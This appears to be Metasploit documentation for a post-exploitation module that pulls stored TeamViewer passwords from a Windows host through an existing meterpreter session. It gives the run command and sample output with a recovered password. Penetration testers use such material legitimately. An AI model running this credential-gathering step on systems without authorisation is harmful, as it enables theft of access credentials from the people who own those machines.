## Vulnerable Application

  Any Windows host with a `meterpreter` session.

## Verification Steps

  1. Get a `meterpreter` session on a Windows host.
  2. Do: ```run post/windows/gather/credentials/teamviewer_passwords```
  3. If the system has registry keys for TeamViewer passwords they will be printed out.

## Options

  None.

## Scenarios

```
meterpreter > run post/windows/gather/credentials/teamviewer_passwords

[*] Finding TeamViewer Passwords on WEQSQUGO-2156
[+] Found Options Password: op****@5
[+] Found Security Password: P@$$w0rd
[+] Passwords stored in: /root/.msf4/loot/20200128065035_default_***.***.***.***_host.teamviewer__290401.txt
```


